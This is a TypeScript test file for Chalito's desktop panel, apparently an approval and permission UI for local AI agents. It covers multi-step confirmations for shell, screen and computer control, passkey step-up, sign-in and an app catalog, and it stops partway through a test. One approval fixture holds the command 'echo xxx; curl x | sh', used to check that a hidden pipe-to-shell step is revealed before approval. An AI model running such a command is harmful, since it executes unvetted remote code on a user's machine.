import catalogJson from "../../../recipes/catalog.json" with { type: "json" };
import { cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import type { ApprovalView, ChalitoClient, NotificationView, Snapshot } from "@chalito/client";
import { lintMessages } from "@chalito/brand";
import type { Locale } from "@chalito/protocol";
import { DEFAULT_SETTINGS, SETTINGS } from "@chalito/ui";
import es from "../messages/es.json";
import en from "../messages/en.json";
import { TextProviders } from "../src/lib/i18n.js";
import {
  unavailableIpc,
  type AgentIpc,
  type AppView,
  type ComputerStatus,
  type DevModeState,
  type TerminalStatus,
  type ScreenStatus,
} from "../src/lib/ipc.js";
import { PushToTalk, unavailableVoice } from "../src/lib/voice.js";
import { Panel, type PanelProps, type Tab } from "../src/panel/Panel.js";
import { SignIn } from "../src/panel/SignIn.js";
import { SignInController } from "../src/lib/sign-in.js";
import { SsoFlow } from "../src/lib/sso.js";

afterEach(cleanup);

const renderPanel = (p: Partial<PanelProps> & { initialTab?: Tab }, locale: Locale = "es") =>
  render(
    <TextProviders locale={locale}>
      <Panel
        client={null}
        ipc={unavailableIpc}
        ptt={new PushToTalk(unavailableVoice)}
        settings={DEFAULT_SETTINGS}
        onSetting={() => undefined}
        dnd={false}
        onDnd={() => undefined}
        hubPlansUrl="https://hub.example/planes"
        phoneVerifier={{ start: async () => ({ ok: true }), check: async () => ({ ok: true }) }}
        {...p}
      />
    </TextProviders>,
  );

describe("panel: settings parity with the PWA", () => {
  it.each(["es", "en"] as const)("renders every registered setting in the desktop shell (%s)", (locale) => {
    const { container } = renderPanel({ initialTab: "settings" }, locale);
    expect(container.querySelector('[data-shell="desktop"]')).not.toBeNull();
    for (const s of SETTINGS) expect(container.querySelector(`[data-setting-key="${s.key}"]`), s.key).not.toBeNull();
  });

  it("edits flow back per setting", () => {
    const onSetting = vi.fn();
    const { container } = renderPanel({ initialTab: "settings", onSetting });
    const privacy = container.querySelector('[data-setting-key="privacyMode"] input[type="checkbox"]');
    expect(privacy).not.toBeNull();
    fireEvent.click(privacy!);
    expect(onSetting).toHaveBeenCalledWith("privacyMode", !DEFAULT_SETTINGS.privacyMode);
  });
});

describe("desktop catalogs", () => {
  const keys = (o: unknown, p = ""): string[] =>
    Object.entries(o as Record<string, unknown>).flatMap(([k, v]) =>
      typeof v === "object" && v ? keys(v, `${p}${k}.`) : [`${p}${k}`],
    );
  it("es and en have the same keys and pass the brand lint", () => {
    expect(keys(en).sort()).toEqual(keys(es).sort());
    expect(lintMessages("apps/desktop/messages/es.json", es)).toEqual([]);
    expect(lintMessages("apps/desktop/messages/en.json", en)).toEqual([]);
  });
});

/** A fake local agent: records calls, answers like the agent would. */
const fakeIpc = (over: Partial<AgentIpc> = {}): AgentIpc & { calls: unknown[][] } => {
  const calls: unknown[][] = [];
  let dev: DevModeState = { on: false, toggles: [], since: null };
  let computer: ComputerStatus = {
    enabled: false,
    active: [{ sid: "s1", label: "chalito", since: 1 }],
    pending: [],
  };
  let terminal: TerminalStatus = { enabled: false, rawShell: false, active: [], pending: [] };
  let scr: ScreenStatus = {
    view: false,
    control: false,
    active: [{ sid: "sc1", label: "Remote screen (view)", mode: "view", since: 1 }],
    pending: [],
  };
  return {
    calls,
    ping: async () => ({ version: "test" }),
    pendingPairing: async () => ({
      pairingId: "p1",
      label: "Pixel 9",
      fingerprint: "ab12 cd34 ef56",
      passkeyId: "AbCdEf…wxyz",
      expiresAt: Date.now() + 60_000,
    }),
    confirmPairing: async (...a) => void calls.push(["confirmPairing", ...a]),
    policy: async () => ({
      seq: 7,
      hash: "0123456789abcdef0123",
      prevHash: null,
      updatedAt: 0,
      rules: [{ id: "r1", summary: "git push", effect: "ask" }],
    }),
    devMode: async () => dev,
    devModeChallenge: async (toggle) => ({
      toggle,
      examples: ["git push sin preguntarte"],
      risk: "Las acciones de riesgo ALTO se ejecutarán sin tu aprobación.",
      liability: { version: 1, phrase: "ACEPTO", text: "Texto legal." },
    }),
    enableDevToggle: async (toggle, answers) => {
      calls.push(["enableDevToggle", toggle, answers]);
      dev = { on: true, toggles: [toggle], since: 1 };
      return { ok: true, state: dev };
    },
    disableDevToggle: async (toggle) => {
      calls.push(["disableDevToggle", toggle]);
      dev = { on: false, toggles: [], since: null };
      return dev;
    },
    reportPresence: async () => undefined,
    apps: async () => ({ apps: [], problems: [], catalog: null }),
    connectAppKey: async (...a) => void calls.push(["connectAppKey", ...a]),
    signinApp: async (...a) => void calls.push(["signinApp", ...a]),
    disconnectApp: async (...a) => void calls.push(["disconnectApp", ...a]),
    installApp: async (...a) => void calls.push(["installApp", ...a]),
    declineAppInstall: async (...a) => void calls.push(["declineAppInstall", ...a]),
    launchApp: async (...a) => void calls.push(["launchApp", ...a]),
    customRecipeChallenge: async (appId) => ({
      title: `Activar «${appId}»`,
      warn: "Chalito ejecutará estos comandos.",
      type: `Escribe «${appId}»`,
      summary: ["sign-in: miagente login"],
    }),
    enableCustomRecipe: async (...a) => (calls.push(["enableCustomRecipe", ...a]), { ok: true as const }),
    disableCustomRecipe: async (...a) => void calls.push(["disableCustomRecipe", ...a]),
    appSessionsChallenge: async (appId) => ({
      title: `Permitir sesiones de «${appId}»`,
      warn: "Esto ejecuta:",
      type: `Escribe «${appId}»`,
      summary: ["acp: goose acp"],
    }),
    enableAppSessions: async (...a) => (calls.push(["enableAppSessions", ...a]), { ok: true as const }),
    disableAppSessions: async (...a) => void calls.push(["disableAppSessions", ...a]),
    computerStatus: async () => computer,
    computerChallenge: async () => ({
      examples: ["Ver todo lo que hay en tu pantalla"],
      risk: "Cada sesión pedirá tu aprobación.",
      phrase: "CONTROLAR MI EQUIPO",
    }),
    enableComputer: async (answers) => {
      calls.push(["enableComputer", answers]);
      computer = { ...computer, enabled: true };
      return { ok: true };
    },
    disableComputer: async () => {
      calls.push(["disableComputer"]);
      computer = { ...computer, enabled: false };
    },
    stopComputer: async () => {
      calls.push(["stopComputer"]);
      computer = { ...computer, active: [] };
    },
    computerPermissions: async () => ({
      platform: "macos",
      screenRecording: false,
      accessibility: true,
      wayland: false,
    }),
    openComputerSettings: async (pane) => void calls.push(["openComputerSettings", pane]),
    terminalStatus: async () => terminal,
    terminalChallenge: async () => ({
      terminal: {
        examples: ["Abrir la app de terminal de una IA"],
        risk: "Cada terminal pedirá tu aprobación.",
        phrase: "TERMINAL REMOTA",
      },
      rawShell: {
        examples: ["Abrir una shell completa"],
        risk: "Es lo mismo que sentarte frente a este teclado.",
        phrase: "SHELL COMPLETA DE MI EQUIPO",
        warning: "Último paso: control total de tu usuario.",
      },
    }),
    enableRemoteTerminal: async (answers) => {
      calls.push(["enableRemoteTerminal", answers]);
      terminal = { ...terminal, enabled: true };
      return { ok: true };
    },
    enableRawShell: async (answers) => {
      calls.push(["enableRawShell", answers]);
      terminal = { ...terminal, rawShell: true };
      return { ok: true };
    },
    disableRemoteTerminal: async () => {
      calls.push(["disableRemoteTerminal"]);
      terminal = { ...terminal, enabled: false, rawShell: false };
    },
    disableRawShell: async () => {
      calls.push(["disableRawShell"]);
      terminal = { ...terminal, rawShell: false };
    },
    screenStatus: async () => scr,
    screenChallenge: async (mode) => ({
      examples: [mode === "control" ? "Mover el mouse desde lejos" : "Ver esta pantalla en vivo"],
      risk: "Cada sesión pedirá tu aprobación con passkey.",
      phrase: mode === "control" ? "CONTROLAR MI PANTALLA" : "VER MI PANTALLA",
    }),
    enableScreen: async (mode, answers) => {
      calls.push(["enableScreen", mode, answers]);
      scr = { ...scr, view: true, control: mode === "control" };
      return { ok: true };
    },
    disableScreen: async (what) => {
      calls.push(["disableScreen", what]);
      scr = { ...scr, control: false, view: what === "control" ? scr.view : false };
    },
    closeScreen: async (sid) => {
      calls.push(["closeScreen", sid]);
      scr = { ...scr, active: scr.active.filter((a) => a.sid !== sid) };
    },
    ...over,
  };
};

describe("panel: local-only security screens", () => {
  it("says the agent isn't reachable while the IPC server doesn't exist", async () => {
    renderPanel({ initialTab: "security" }, "en");
    await waitFor(() => expect(screen.getAllByText(/local agent isn't answering/)).toHaveLength(6));
  });

  it("reverse check: shows the phone's fingerprint and sends the local verdict", async () => {
    const ipc = fakeIpc();
    renderPanel({ initialTab: "security", ipc }, "en");
    expect(await screen.findByText("ab12 cd34 ef56")).toBeTruthy();
    expect(screen.getByText(/Pixel 9/)).toBeTruthy();
    fireEvent.click(screen.getByText("They don't match"));
    await waitFor(() => expect(ipc.calls).toContainEqual(["confirmPairing", "p1", false]));
  });

  it("policy view shows the chain head and rules", async () => {
    renderPanel({ initialTab: "security", ipc: fakeIpc() }, "en");
    expect(await screen.findByText("Version 7 · 0123456789ab")).toBeTruthy();
    expect(screen.getByText("git push")).toBeTruthy();
  });

  it("Developer mode: three confirmations, the last needs the box AND the exact phrase", async () => {
    const ipc = fakeIpc();
    const { container } = renderPanel({ initialTab: "security", ipc }, "en");
    const row = await waitFor(() => {
      const el = container.querySelector('[data-toggle="autoApproveHigh"] button');
      if (!el) throw new Error("not yet");
      return el;
    });
    fireEvent.click(row);
    await screen.findByText(/git push sin preguntarte/);
    fireEvent.click(screen.getByText("Continue"));
    expect(screen.getByText(/riesgo ALTO/)).toBeTruthy();
    fireEvent.click(screen.getByText("Continue"));
    const confirm = screen.getByText("Turn on (asks for your password)") as HTMLButtonElement;
    expect(confirm.disabled).toBe(true);
    fireEvent.change(screen.getByLabelText("ACEPTO"), { target: { value: "ACEPTO" } });
    expect(confirm.disabled).toBe(true); // box not ticked yet
    fireEvent.click(screen.getByLabelText(/I accept the liability/));
    expect(confirm.disabled).toBe(false);
    fireEvent.click(confirm);
    await screen.findByText("Developer mode ACTIVE");
    expect(ipc.calls).toContainEqual([
      "enableDevToggle",
      "autoApproveHigh",
      { first: true, second: true, liability: { checked: true, typed: "ACEPTO" } },
    ]);
  });

  it("computer control: local enable with two confirmations and the phrase; stop and permissions", async () => {
    const ipc = fakeIpc();
    const { container } = renderPanel({ initialTab: "security", ipc }, "en");
    expect(await screen.findByText("In control now: chalito")).toBeTruthy();
    fireEvent.click(screen.getByText("Stop control"));
    await waitFor(() => expect(ipc.calls).toContainEqual(["stopComputer"]));
    expect(await screen.findByText(/Screen Recording: missing/)).toBeTruthy();
    fireEvent.click(screen.getByText("Open Settings"));
    expect(ipc.calls).toContainEqual(["openComputerSettings", "screenRecording"]);

    fireEvent.click(container.querySelector('[data-computer="off"] button')!);
    await screen.findByText(/Ver todo lo que hay/);
    fireEvent.click(screen.getByText("Continue"));
    expect(screen.getByText(/aprobación/)).toBeTruthy();
    fireEvent.click(screen.getByText("Continue"));
    const confirm = screen.getByText("Turn on (asks for your password)", {
      selector: '[data-step="3"] button',
    }) as HTMLButtonElement;
    expect(confirm.disabled).toBe(true);
    fireEvent.change(screen.getByLabelText("CONTROLAR MI EQUIPO"), { target: { value: "controlar" } });
    expect(confirm.disabled).toBe(true);
    fireEvent.change(screen.getByLabelText("CONTROLAR MI EQUIPO"), { target: { value: "CONTROLAR MI EQUIPO" } });
    fireEvent.click(confirm);
    await waitFor(() => expect(container.querySelector('[data-computer="on"]')).not.toBeNull());
    expect(ipc.calls).toContainEqual(["enableComputer", { first: true, second: true, typed: "CONTROLAR MI EQUIPO" }]);
  });

  it("remote terminal: local enable with the phrase; the raw shell needs a fourth step", async () => {
    const ipc = fakeIpc();
    const { container } = renderPanel({ initialTab: "security", ipc }, "en");
    const section = await waitFor(() => {
      const el = container.querySelector('[data-section="terminal"]');
      if (!el?.querySelector('[data-terminal="off"]')) throw new Error("not yet");
      return el as HTMLElement;
    });
    expect(section.querySelector("[data-raw-shell]")).toBeNull();
    fireEvent.click(section.querySelector('[data-terminal="off"] button')!);
    await within(section).findByText(/Abrir la app de terminal/);
    fireEvent.click(within(section).getByText("Continue"));
    fireEvent.click(within(section).getByText("Continue"));
    const confirm = within(section).getByText("Turn on (asks for your password)") as HTMLButtonElement;
    expect(confirm.disabled).toBe(true);
    fireEvent.change(within(section).getByLabelText("TERMINAL REMOTA"), { target: { value: "TERMINAL REMOTA" } });
    fireEvent.click(confirm);
    await waitFor(() => expect(section.querySelector('[data-raw-shell="off"]')).not.toBeNull());
    expect(ipc.calls).toContainEqual(["enableRemoteTerminal", { first: true, second: true, typed: "TERMINAL REMOTA" }]);

    fireEvent.click(section.querySelector('[data-raw-shell="off"] button')!);
    await within(section).findByText(/Abrir una shell completa/);
    fireEvent.click(within(section).getByText("Continue"));
    fireEvent.click(within(section).getByText("Continue"));
    fireEvent.change(within(section).getByLabelText("SHELL COMPLETA DE MI EQUIPO"), {
      target: { value: "SHELL COMPLETA DE MI EQUIPO" },
    });
    fireEvent.click(within(section).getByText("Continue"));
    expect(within(section).getByText(/control total/)).toBeTruthy();
    fireEvent.click(within(section).getByText("Turn on (asks for your password)"));
    await waitFor(() => expect(section.querySelector('[data-raw-shell="on"]')).not.toBeNull());
    expect(ipc.calls).toContainEqual([
      "enableRawShell",
      { first: true, second: true, typed: "SHELL COMPLETA DE MI EQUIPO", final: true },
    ]);
    fireEvent.click(section.querySelector('[data-terminal="on"] button')!);
    await waitFor(() => expect(ipc.calls).toContainEqual(["disableRemoteTerminal"]));
  });

  it("remote screen: local enable (view, then control) with the phrase; close a session; turn off", async () => {
    const ipc = fakeIpc();
    const { container } = renderPanel({ initialTab: "security", ipc }, "en");
    expect(await screen.findByText("Open session: Remote screen (view)")).toBeTruthy();
    fireEvent.click(within(container.querySelector('[data-screen-session="sc1"]')!).getByText("Close"));
    await waitFor(() => expect(ipc.calls).toContainEqual(["closeScreen", "sc1"]));

    fireEvent.click(within(container.querySelector('[data-screen="off"]')!).getByText("Turn on viewing"));
    await screen.findByText(/Ver esta pantalla en vivo/);
    fireEvent.click(screen.getByText("Continue"));
    fireEvent.click(screen.getByText("Continue"));
    const confirm = screen.getByText("Turn on (asks for your password)", {
      selector: '[data-step="3"] button',
    }) as HTMLButtonElement;
    expect(confirm.disabled).toBe(true);
    fireEvent.change(screen.getByLabelText("VER MI PANTALLA"), { target: { value: "VER MI PANTALLA" } });
    fireEvent.click(confirm);
    await waitFor(() => expect(container.querySelector('[data-screen="view"]')).not.toBeNull());
    expect(ipc.calls).toContainEqual(["enableScreen", "view", { first: true, second: true, typed: "VER MI PANTALLA" }]);

    fireEvent.click(within(container.querySelector('[data-screen="view"]')!).getByText("Turn on control"));
    await screen.findByText(/Mover el mouse desde lejos/);
    fireEvent.click(screen.getByText("Continue"));
    fireEvent.click(screen.getByText("Continue"));
    fireEvent.change(screen.getByLabelText("CONTROLAR MI PANTALLA"), { target: { value: "CONTROLAR MI PANTALLA" } });
    fireEvent.click(screen.getByText("Turn on (asks for your password)", { selector: '[data-step="3"] button' }));
    await waitFor(() => expect(container.querySelector('[data-screen="control"]')).not.toBeNull());

    fireEvent.click(within(container.querySelector('[data-screen="control"]')!).getByText("Remove control"));
    await waitFor(() => expect(container.querySelector('[data-screen="view"]')).not.toBeNull());
    fireEvent.click(within(container.querySelector('[data-screen="view"]')!).getByText("Turn off"));
    await waitFor(() => expect(container.querySelector('[data-screen="off"]')).not.toBeNull());
    expect(ipc.calls).toContainEqual(["disableScreen", "control"]);
    expect(ipc.calls).toContainEqual(["disableScreen", "all"]);
  });

  it("Developer mode: cancelling sends nothing", async () => {
    const ipc = fakeIpc();
    const { container } = renderPanel({ initialTab: "security", ipc }, "en");
    await waitFor(() => expect(container.querySelector('[data-toggle="allowSudo"] button')).not.toBeNull());
    fireEvent.click(container.querySelector('[data-toggle="allowSudo"] button')!);
    fireEvent.click(await screen.findByText("Cancel"));
    expect(ipc.calls).toEqual([]);
  });
});

const approval = (o: Partial<ApprovalView>): ApprovalView => ({
  aid: "a1",
  sid: "s1",
  agentDeviceId: "d1",
  requestId: "r1",
  kind: "tool",
  risk: "MED",
  origin: "claude-code",
  stepUpRequired: false,
  status: "pending",
  reason: null,
  createdAt: 0,
  expiresAt: Date.now() + 60_000,
  details: { summary: "Run npm test" },
  verified: true,
  detailsHash: "a".repeat(64),
  rev: 1,
  ...o,
});

const notice: NotificationView = {
  nid: "n1",
  level: "L2",
  source: "agent",
  urgency: "normal",
  counts: {},
  deepLink: "/",
  state: "pending",
  createdAt: 0,
  rev: 1,
};

/** The LiveStore/ClientActions surface the inbox uses. */
const fakeClient = (snap: Partial<Snapshot>) => {
  const full: Snapshot = {
    status: "live",
    approvals: [],
    sessions: [],
    events: {},
    notifications: [],
    devices: [],
    devModeActive: false,
    ...snap,
  };
  const decide = vi.fn(async () => undefined);
  const ackNotification = vi.fn(async () => undefined);
  const client = {
    live: { subscribe: () => () => undefined, getSnapshot: () => full },
    actions: { decide, ackNotification },
  } as unknown as Pick<ChalitoClient, "live" | "actions">;
  return { client, decide, ackNotification };
};

describe("panel: inbox", () => {
  it("offline until the client connects", () => {
    renderPanel({}, "en");
    expect(screen.getByText(/Not connected/)).toBeTruthy();
  });

  it("lists pending approvals and notices and sends decisions / acks", async () => {
    const f = fakeClient({
      approvals: [approval({}), approval({ aid: "a2", status: "approved" })],
      notifications: [notice],
    });
    const { container } = renderPanel({ client: f.client }, "en");
    expect(container.querySelectorAll("[data-aid]")).toHaveLength(1);
    expect(screen.getByText("Run npm test")).toBeTruthy();
    fireEvent.click(screen.getByText("Approve"));
    fireEvent.click(screen.getByText("Seen"));
    await waitFor(() => expect(f.decide).toHaveBeenCalledWith("a1", true));
    expect(f.ackNotification).toHaveBeenCalledWith("n1");
  });

  it("shows why a decision failed", async () => {
    const f = fakeClient({ approvals: [approval({})] });
    f.decide.mockRejectedValueOnce(new Error("step_up_cancelled"));
    renderPanel({ client: f.client }, "en");
    fireEvent.click(screen.getByText("Deny"));
    expect(await screen.findByRole("alert")).toHaveProperty("textContent", "Couldn't send: step_up_cancelled");
  });
});

describe("panel: step-up capability", () => {
  const high = approval({ aid: "h1", risk: "HIGH", details: { summary: "git push --force" } });
  const low = approval({ aid: "l1", risk: "LOW", details: { summary: "ls" } });

  it("without a passkey: HIGH says approve from the phone (no approve button), deny stays", () => {
    const f = fakeClient({ approvals: [high, low] });
    const { container } = renderPanel({ client: f.client, canStepUp: false });
    const row = container.querySelector('[data-aid="h1"]')!;
    expect(row.querySelector("[data-phone-only]")!.textContent).toBe("Aprueba esta acción desde tu teléfono");
    expect([...row.querySelectorAll("button")].map((b) => b.textContent)).toEqual(["Rechazar"]);
    const lowRow = container.querySelector('[data-aid="l1"]')!;
    expect([...lowRow.querySelectorAll("button")].map((b) => b.textContent)).toEqual(["Aprobar", "Rechazar"]);
  });

  it("with a passkey: HIGH can be approved here", () => {
    const f = fakeClient({ approvals: [high] });
    const { container } = renderPanel({ client: f.client, canStepUp: true }, "en");
    expect(container.querySelector("[data-phone-only]")).toBeNull();
    fireEvent.click(screen.getByText("Approve"));
    expect(f.decide).toHaveBeenCalledWith("h1", true);
  });
});

describe("panel: sign-in screen", () => {
  it("not configured in this build", () => {
    renderPanel({ signIn: <SignIn controller={null} /> }, "en");
    expect(screen.getByText(/isn't configured/)).toBeTruthy();
  });

  it("walks the steps the controller reports", async () => {
    const flow = new SsoFlow("https://chalyb.com/launch");
    const opened: string[] = [];
    let release: (d: unknown) => void = () => undefined;
    const controller = new SignInController({
      flow,
      openUrl: async (u) => void opened.push(u),
      exchange: async () => ({ ok: true, owner: "8a7a0d3c-5b5e-4a39-9d2b-2f8b1e0c4a11" }),
      enroll: (_o, onDisplay) =>
        new Promise((resolve) => {
          onDisplay({ shortCode: "KQ7RM" });
          release = () =>
            resolve({
              ok: true,
              deviceId: "d",
              customToken: "h",
              passkey: "unavailable",
              credential: null,
              agents: [],
              droppedAgents: [],
            });
        }),
    });
    const { container } = renderPanel({ signIn: <SignIn controller={controller} /> }, "en");
    fireEvent.click(screen.getByText("Sign in"));
    await waitFor(() => expect(container.querySelector('[data-sign-in="browser"]')).not.toBeNull());
    const state = new URL(opened[0]!).searchParams.get("state")!;
    void controller.handleUrl(`chalito://auth/sso?token=t&state=${state}`);
    expect(await screen.findByText("KQ7RM")).toBeTruthy();
    release(null);
    expect(await screen.findByText(/HIGH or CRITICAL actions are approved from your phone/)).toBeTruthy();
  });

  it("shows the reason and a retry on error", async () => {
    const controller = new SignInController({
      flow: new SsoFlow("https://chalyb.com/launch"),
      openUrl: () => Promise.reject(new Error("x")),
      exchange: async () => ({ ok: false, reason: "exchange_failed" }),
      enroll: async () => ({ ok: false, reason: "failed" }),
    });
    renderPanel({ signIn: <SignIn controller={controller} /> }, "en");
    fireEvent.click(screen.getByText("Sign in"));
    expect(await screen.findByRole("alert")).toHaveProperty("textContent", "Couldn't open the browser.");
    expect(screen.getByText("Try again")).toBeTruthy();
  });
});

describe("panel: endorsement refusals are never silent (R-L13)", () => {
  const agent = (lastEvent: unknown) => ({
    deviceId: "agent1",
    role: "agent" as const,
    kind: "laptop",
    platform: "linux",
    name: "Laptop",
    revoked: false,
    online: true,
    lastSeenAt: 1,
    devMode: { on: false, toggles: [], since: null },
    policyHash: null,
    lastEvent,
    rev: 1,
  });
  const refused = {
    v: 1,
    type: "trust.endorsement_refused",
    deviceId: "agent1",
    clientDeviceId: "dev_new",
    endorsedBy: "dev_phone",
    reason: "missing_step_up",
    t: 1,
  };

  it("shows the agent's refusal with what to do", () => {
    const f = fakeClient({ devices: [agent(refused)] });
    renderPanel({ client: f.client, initialTab: "security" }, "en");
    expect(screen.getByRole("alert").textContent).toMatch(/“Laptop” refused a new device: .*passkey/);
  });

  it("nothing when no agent reports one (or the event is something else)", () => {
    const f = fakeClient({
      devices: [
        agent({ v: 1, type: "policy.changed", deviceId: "agent1", policyHash: "a".repeat(64), t: 1 }),
        agent(null),
      ],
    });
    const { container } = renderPanel({ client: f.client, initialTab: "security" }, "en");
    expect(container.querySelector('[data-section="notices"]')).toBeNull();
  });
});

describe("panel: approvals bound to what the agent signed (R-H1, R-M10)", () => {
  it("an unverified approval is marked and can only be denied", () => {
    const f = fakeClient({ approvals: [approval({ verified: false, detailsHash: null })] });
    const { container } = renderPanel({ client: f.client, canStepUp: true }, "en");
    expect(container.querySelector("[data-unverified]")?.textContent).toMatch(/Unverified/);
    expect([...container.querySelectorAll('[data-aid="a1"] button')].map((b) => b.textContent)).toEqual(["Deny"]);
  });

  it("a truncated summary: Approve stays disabled until the full command is opened", () => {
    const f = fakeClient({
      approvals: [
        approval({
          details: {
            summary: "Bash: echo xxx… (+42 chars)",
            summaryTruncated: true,
            input: { command: "echo xxx; curl x | sh" },
          },
        }),
      ],
    });
    const { container } = renderPanel({ client: f.client, canStepUp: true }, "en");
    const approve = screen.getByText("Approve") as HTMLButtonElement;
    expect(approve.disabled).toBe(true);
    const details = container.querySelector("details")!;
    details.open = true;
    fireEvent(details, new Event("toggle"));
    expect(approve.disabled).toBe(false);
    expect(container.querySelector("pre.full-input")?.textContent).toContain("curl x | sh");
  });
});

describe("panel: IA conectadas (catalog)", () => {
  const recipes = catalogJson as unknown as { recipes: AppView["recipe"][] };
  const recipe = (id: string) => recipes.recipes.find((r) => r.id === id)!;
  const doc = (
    state: AppView["doc"]["state"],
    kind: AppView["doc"]["kind"],
    o: Partial<AppView["doc"]> = {},
  ): AppView["doc"] => ({
    mode: null,
    connected: state === "connected",
    state,
    cli: { installed: state !== "not_installed", version: state === "not_installed" ? null : "1.0.0" },
    error: null,
    at: 1,
    kind,
    custom: false,
    ...o,
  });
  const app = (id: string, d: AppView["doc"], o: Partial<AppView> = {}): AppView => ({
    appId: id,
    recipe: recipe(id),
    custom: false,
    enabled: true,
    doc: d,
    signinAllowed: false,
    installRequestedUntil: null,
    supported: true,
    install: Object.values(recipe(id).platforms)[0]?.install ?? null,
    sessions: null,
    ...o,
  });
  const mine = {
    ...recipe("goose"),
    id: "mi-agente",
    name: "Mi agente",
    vendor: "Yo",
    kinds: ["terminal" as const],
  };
  const views = () => ({
    apps: [
      app("claude-code", doc("needs_auth", "claude-sdk")),
      app("codex", doc("connected", "codex", { mode: "api_key" })),
      app("grok", doc("needs_auth", "acp"), { signinAllowed: true }),
      app("gemini", doc("not_installed", "acp"), { signinAllowed: true, installRequestedUntil: 9e15 }),
      app("chatgpt", doc("available", "web-app")),
      app("claude-desktop", doc("not_installed", "desktop-app")),
      app("aider", doc("needs_auth", "terminal"), { signinAllowed: true }),
      {
        ...app("goose", doc("error", "terminal", { custom: true, name: "Mi agente", error: "recipe_disabled" })),
        appId: "mi-agente",
        recipe: mine,
        custom: true,
        enabled: false,
      },
    ],
    problems: [{ file: "roto.yaml", reason: "invalid" as const }],
    catalog: { source: "builtin" as const, issuedAt: 1 },
  });
  const row = (c: HTMLElement, id: string) => c.querySelector(`[data-app="${id}"]`) as HTMLElement;
  const buttons = (c: HTMLElement, id: string) => [...row(c, id).querySelectorAll("button")].map((b) => b.textContent);

  it("groups the curated apps by kind and the person's own recipes under Personalizada", async () => {
    const { container } = renderPanel({ initialTab: "ai", ipc: fakeIpc({ apps: async () => views() }) }, "es");
    await waitFor(() => expect(container.querySelectorAll("[data-app]")).toHaveLength(8));
    const group = (g: string) =>
      [...container.querySelectorAll(`[data-group="${g}"] [data-app]`)].map((e) => e.getAttribute("data-app"));
    expect(group("agents")).toEqual(["claude-code", "codex", "grok", "gemini", "aider"]);
    expect(group("desktop")).toEqual(["claude-desktop"]);
    expect(group("web")).toEqual(["chatgpt"]);
    expect(group("custom")).toEqual(["mi-agente"]);
    expect(container.textContent).toContain("Personalizada");
    expect(container.textContent).toContain("roto.yaml: no es una receta válida.");
  });

  it("each app offers only what it supports: keys, its own sign-in, opening it, installing it", async () => {
    const { container } = renderPanel({ initialTab: "ai", ipc: fakeIpc({ apps: async () => views() }) }, "es");
    await waitFor(() => expect(row(container, "chatgpt")).toBeTruthy());
    expect(buttons(container, "claude-code")).toEqual(["Conectar con API key"]);
    expect(buttons(container, "grok")).toEqual(["Conectar con API key", "Iniciar sesión"]);
    expect(row(container, "codex").textContent).toContain("Conectado · con tu API key");
    expect(buttons(container, "chatgpt")).toEqual(["Abrir (inicias sesión ahí)"]);
    expect(buttons(container, "claude-desktop")).toEqual(["Instalar"]);
    // A sign-in that only works in the app's own terminal UI is a hint, not a button.
    expect(buttons(container, "aider")).toEqual(["Conectar con API key"]);
    expect(row(container, "aider").textContent).toContain("ejecuta: aider");
    // A custom recipe that's off: only turning it on (here) is offered.
    expect(buttons(container, "mi-agente")).toEqual(["Activar en esta computadora"]);
  });

  it("a key goes to the agent over the local IPC; sign-in, open and disconnect are local actions", async () => {
    const ipc = fakeIpc({ apps: async () => views() });
    const { container } = renderPanel({ initialTab: "ai", ipc }, "en");
    await waitFor(() => expect(row(container, "grok")).toBeTruthy());
    fireEvent.click(within(row(container, "claude-code")).getByText("Connect with an API key"));
    fireEvent.change(row(container, "claude-code").querySelector('input[type="password"]')!, {
      target: { value: " sk-ant-x " },
    });
    fireEvent.click(within(row(container, "claude-code")).getByText("Save"));
    await waitFor(() => expect(ipc.calls).toContainEqual(["connectAppKey", "claude-code", "sk-ant-x"]));

    fireEvent.click(within(row(container, "grok")).getByText("Sign in"));
    await waitFor(() => expect(ipc.calls).toContainEqual(["signinApp", "grok"]));
    fireEvent.click(within(row(container, "chatgpt")).getByText("Open (sign in there)"));
    await waitFor(() => expect(ipc.calls).toContainEqual(["launchApp", "chatgpt"]));

    fireEvent.click(within(row(container, "codex")).getByText("Disconnect"));
    expect(ipc.calls.some((c) => c[0] === "disconnectApp")).toBe(false);
    fireEvent.click(within(row(container, "codex")).getByText("Yes, disconnect"));
    await waitFor(() => expect(ipc.calls).toContainEqual(["disconnectApp", "codex"]));
  });

  it("installs only after a yes here, also when another device asked for it, naming the official source", async () => {
    const ipc = fakeIpc({ apps: async () => views() });
    const { container } = renderPanel({ initialTab: "ai", ipc }, "en");
    await waitFor(() => expect(row(container, "gemini")).toBeTruthy());
    const gemini = row(container, "gemini");
    expect(gemini.textContent).toContain("from another device");
    expect(gemini.textContent).toContain("@google/gemini-cli");
    expect(ipc.calls.some((c) => c[0] === "installApp")).toBe(false);
    fireEvent.click(within(gemini).getAllByText("Yes, install")[0]!);
    await waitFor(() => expect(ipc.calls).toContainEqual(["installApp", "gemini"]));

    fireEvent.click(within(row(container, "claude-desktop")).getByText("Install"));
    expect(row(container, "claude-desktop").querySelector("a")?.getAttribute("href")).toBe(
      recipe("claude-desktop").termsUrl,
    );
  });

  it("a custom recipe is turned on here only after reviewing its commands and typing its id", async () => {
    const ipc = fakeIpc({ apps: async () => views() });
    const { container } = renderPanel({ initialTab: "ai", ipc }, "es");
    await waitFor(() => expect(row(container, "mi-agente")).toBeTruthy());
    fireEvent.click(within(row(container, "mi-agente")).getByText("Activar en esta computadora"));
    await waitFor(() => expect(row(container, "mi-agente").textContent).toContain("sign-in: miagente login"));
    const yes = within(row(container, "mi-agente")).getByText("Sí, activar") as HTMLButtonElement;
    expect(yes.disabled).toBe(true);
    fireEvent.change(row(container, "mi-agente").querySelector("input")!, { target: { value: "mi-agente" } });
    expect(yes.disabled).toBe(false);
    fireEvent.click(yes);
    await waitFor(() =>
      expect(ipc.calls).toContainEqual(["enableCustomRecipe", "mi-agente", { review: true, typed: "mi-agente" }]),
    );
  });

  it("an app's sessions are off until allowed here (review + typed id); turning them off is one click", async () => {
    const ipc = fakeIpc({
      apps: async () => ({
        apps: [
          app("goose", doc("connected", "acp", { mode: "signin" }), { sessions: false }),
          app("opencode", doc("connected", "acp", { mode: "signin" }), { sessions: true }),
          // The four former providers (null: policy.adapters decides) and web apps show nothing.
          app("codex", doc("connected", "codex", { mode: "api_key" })),
          app("chatgpt", doc("available", "web-app"), { sessions: false }),
        ],
        problems: [],
        catalog: null,
      }),
    });
    const { container } = renderPanel({ initialTab: "ai", ipc }, "en");
    await waitFor(() => expect(row(container, "goose")).toBeTruthy());
